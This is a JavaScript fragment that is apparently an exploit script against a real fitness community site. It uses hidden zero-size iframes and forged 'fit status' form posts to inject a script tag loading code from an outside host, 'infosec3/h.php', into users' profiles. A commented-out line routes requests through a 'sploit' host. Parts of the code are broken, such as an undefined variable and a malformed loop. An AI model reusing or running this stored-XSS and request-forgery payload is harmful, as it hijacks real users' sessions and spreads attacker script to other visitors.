function remove(id) { var e = document.getElementById(id);
if (e && e.parentNode) { console.log("remove: " + id); e.parentNode.removeChild(elem); } else { console.log("can't find: " + id); }

debug("begin fit_status");
/*
$.get("http://my.bodybuilding.com/community/my-bodyspace", function (data) {
console.log(data);
alert("control panel loaded");
});
*/


// setup the session to recieve a fit status post
$('<iframe>')
  .css({
 position: 'absolute',
 width: '0',
 height: '0',
 background: '#fff',
 name: 'mypage',
 id: 'mypage'
 }).attr('src', "http://my.bodybuilding.com/community/my-bodyspace/").appendTo('body');
console.log("my prepped");
window.setTimeout(function() { remove("mypage"); console.log("my prep removed"); }, 50);

/*
var pcw = $(".profile-comment-wrapper");
console.log(pcw);
pcw.getAttribute();
*/

var url1 = "http%3A%2F%2Fmy.bodybuilding.com/community/my-bodyspace/%3F";
debug(url1);
var url2 = "-1.IBehaviorListener.0-superbox-fitStatusForm-saveFitStatus";
debug(url2);



function removeAll() { for (var i = n; i>n-10; i--); { remove(i); } if(n < 10) { window.setTimeout(sprayFrames, 200);} }
function sprayFrames() {
for (var i = n; i<n+3; i++) {
//$('<iframe>').css({position: 'absolute', width: '0', height: '0', name: n, id: n}).attr('src', "http://"+sploit+"/cs_post.php?action="+url1+i+url2).appendTo('body');
xsscop(url1+i+url2, {saveFitStatus:"1", fitStatusText:"<script src='//infosec3/h.php'></script>I love Mondays"});
console.log("inject iframe: " + i);
}
//window.setTimeout(removeAll, 50);
debug("3 iframes injected");
}

debug("spraying iframes");
